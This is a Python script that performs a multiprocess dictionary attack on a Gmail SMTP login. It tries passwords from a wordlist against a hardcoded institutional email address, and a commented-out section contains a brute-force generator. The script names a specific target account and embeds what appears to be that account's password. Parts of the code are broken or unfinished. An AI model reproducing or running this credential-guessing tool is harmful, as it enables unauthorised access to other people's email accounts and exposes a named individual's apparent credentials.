# import all necessary packages
import os
import requests
import string, itertools
import time
import multiprocessing
import math
from email.message import EmailMessage
import imaplib, ssl
import smtplib
import sys
from mailer import Mailer
# variables
# EMAIL_ADDRESS = "baleenwhalor@gmail.com"
email_password = ""
processes = []
processorNum = 10
f = open("passlist", "r+")
password_list = f.readlines()
#password_list = ["False Pass item: 1", "False Pass item: 2", "False Pass item: 3", "False Pass item: 4", "Spa24Ngeles20110012", "False Pass item: 6"]
if processorNum > len(password_list):
    processorNum = len(password_list)
interval = math.floor(len(password_list) / processorNum)

passChars="!""#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
payload = {}
s = requests.session()

# FUNCTIONS
# login func
def login(email_password):
    email_address="spangeles24@xs.edu.ph"
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    try:
        server.connect()
        server.login(email_address, email_password)
        print(f"Password found: {email_password}")
        sys.exit()
    except Exception as e:
        print(e)
    server.quit()

# dictionary attack func
def dictionary_attack(processorID):
    if processorID < (processorNum - 1):
        for i in range(round(interval)):
            list_item = i + interval * processorID
            email_password = password_list[list_item]
            login(email_password)
#0i + 3i * 0p
    elif processorID == (processorNum - 1):
        for i in range(len(password_list) - processorID):
            list_item = i + interval * processorID
            email_password = password_list[list_item]
            login(email_password)
# random attack func
def brute_force_attack(processorID):
    x = True

# multiprocessors
for processorID in range(processorNum):
    p = multiprocessing.Process(target=dictionary_attack, args=[processorID])
    if __name__ == '__main__':
        p.start()
        processes.append(p)
for p in processes:
    p.join()

finish = time.perf_counter()
# print("Finished running after : " + str(finish))



'''
import os
import smtplib
import time
import string, itertools

characters = string.printable

def iter_all_strings():
    length = 19
    while True:
        for s in itertools.product(characters, repeat=length):
            yield "".join(s)
        length += 1

passList = ["1", "2", "1", "2","1", "2", "1", "2","1", "2", "1", "2","1", "2", "1", "2","1", "2", "1", "2","1", "2", "1", "2","1", "2", "1", "2","1", "2", "1", "2","1", "2", "1", "2","1", "2", "1", "2","1", "2", "1", "2","Spa24Ngeles20110012"]
count = 0
#CoreyMSchaffer@gmail.com
EMAIL_ADDRESS = "spangeles24@xs.edu.ph"
EMAIL_PASSWORD = passList[count]
RECEIVER = ["baleenwhalor@gmail.com"]
num =1

#587 is normal smtp server
#465 for SMTP SSL server
smtpserver = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    for i in iter_all_strings():
        EMAIL_PASSWORD=i
        print(i)
        try:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            print("successful")
            print(f"password is {passList(count)}")
        except:
            print("password incorrect")
            pass
'''
